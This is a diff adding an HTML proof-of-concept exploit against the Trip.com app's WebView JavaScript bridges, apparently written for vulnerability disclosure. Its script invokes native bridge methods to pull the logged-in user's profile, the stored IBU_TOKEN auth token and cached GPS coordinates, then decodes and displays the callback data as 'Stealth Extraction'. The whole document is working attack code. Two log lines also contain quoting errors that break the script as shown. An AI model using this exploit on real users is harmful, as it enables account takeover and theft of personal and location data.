@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bridge Exploit PoC - Trip.com</title>
+    <style>
+        :root {
+            --bg-color: #000;
+            --text-color: #fff;
+            --highlight-color: #f0ad4e;
+            --success-color: #5cb85c;
+            --error-color: #d9534f;
+            --header-color: #4a90e2;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .terminal-header {
+            border-bottom: 1px solid var(--text-color);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+        }
+
+        .title {
+            color: var(--header-color);
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+
+        .status-line {
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+
+        #output {
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .log-entry {
+            margin-bottom: 8px;
+        }
+
+        .timestamp {
+            color: #888;
+            margin-right: 10px;
+        }
+
+        .label {
+            color: var(--highlight-color);
+            font-weight: bold;
+        }
+
+        .data-block {
+            background-color: #111;
+            border: 1px solid #333;
+            padding: 10px;
+            margin: 10px 0;
+            border-left: 4px solid var(--header-color);
+        }
+
+        .success { color: var(--success-color); }
+        .error { color: var(--error-color); }
+        .highlight { color: var(--highlight-color); }
+
+        .scan-line {
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal-header">
+        <div class="title">TRIP.COM BRIDGE EXPLOIT v2.0</div>
+        <div class="status-line">> System Initialized... <span class="scan-line">_</span></div>
+    </div>
+
+    <div id="output"></div>
+
+    <script>
+        const output = document.getElementById('output');
+
+        function log(message, type = '') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span class="timestamp">[${time}]</span>${message}`;
+            output.appendChild(entry);
+            window.scrollTo(0, document.body.scrollHeight);
+        }
+
+        function renderData(title, data) {
+            const block = document.createElement('div');
+            block.className = 'data-block';
+            let content = `<div class="label">${title}</div>`;
+            
+            if (typeof data === 'object') {
+                content += `<pre>${JSON.stringify(data, null, 2)}</pre>`;
+            } else {
+                content += `<div>${data}</div>`;
+            }
+            
+            block.innerHTML = content;
+            output.appendChild(block);
+        }
+
+        // The critical callback handler
+        window.__bridge_callback = function(encodedData) {
+            log('<span class="success">BRIDGE CALLBACK INTERCEPTED!</span>');
+            try {
+                // Native layer returns Base64 encoded JSON
+                const decodedJson = atob(encodedData);
+                const payload = JSON.parse(decodedJson);
+                
+                log(`[INFO] Tag: <span class="highlight">${payload.tagname}</span>`);
+                
+                if (payload.param) {
+                    renderData(`Payload: ${payload.tagname}`, payload.param);
+                } else if (payload.error_code) {
+                    log(`[ERROR] ${payload.error_code}`, 'error');
+                } else {
+                    renderData(`Raw Response: ${payload.tagname}`, payload);
+                }
+            } catch (e) {
+                log(`[FATAL] Callback Decode Error: ${e.message}`, 'error');
+                log(`[DEBUG] Raw: ${encodedData.substring(0, 50)}...`);
+            }
+        };
+
+        function callBridge(bridge, method, params = {}) {
+            if (window[bridge] && window[bridge][method]) {
+                const callbackTag = `${bridge}_${method}_${Date.now()}`;
+                
+                // IMPORTANT: The key MUST be "callback_tagname"
+                const payload = {
+                    ...params,
+                    "callback_tagname": callbackTag
+                };
+
+                log(`[INFO] Invoking: <span class="highlight">${bridge}.${method}</span>`);
+                try {
+                    window[bridge][method](JSON.stringify(payload));
+                } catch (e) {
+                    log(`[ERROR] Invocation Failed: ${e.message}`, 'error');
+                }
+            } else {
+                log(`[WARN] Bridge Not Found: ${bridge}.${method}`, 'error');
+            }
+        }
+
+        log("Starting Stealth Extraction...");
+
+        // 1. Impact Proof: Benign methods
+        setTimeout(() => {
+            log("Querying Application Info (Impact Proof)...");
+            callBridge('IBUApplication_a', 'getApplicationInfo');
+        }, 500);
+
+        setTimeout(() => {
+            log("Querying Hybrid Package Info...");
+            callBridge('Util_a', 'getHybridPackageInfo');
+        }, 1500);
+
+        // 2. Sensitive Data Extraction (PII + Tokens)
+        setTimeout(() => {
+            log("<span class="highlight">CRITICAL: Extracting Login User Info...</span>");
+            callBridge('User_a', 'getUserInfo');
+        }, 3000);
+
+        // 3. Storage Leaks
+        setTimeout(() => {
+            log("<span class="highlight">CRITICAL: Extracting Token from Storage...</span>");
+            callBridge('IBUStorageV2_a', 'IBUGetUserValue', {
+                "bussiness": "ibu_user",
+                "key": "IBU_TOKEN"
+            });
+        }, 4500);
+
+        // 4. Location Leak
+        setTimeout(() => {
+            log("Querying Precise GPS Coordinates...");
+            callBridge('Locate_a', 'getCachedLocationData');
+        }, 6000);
+
+    </script>
+</body>
+</html>
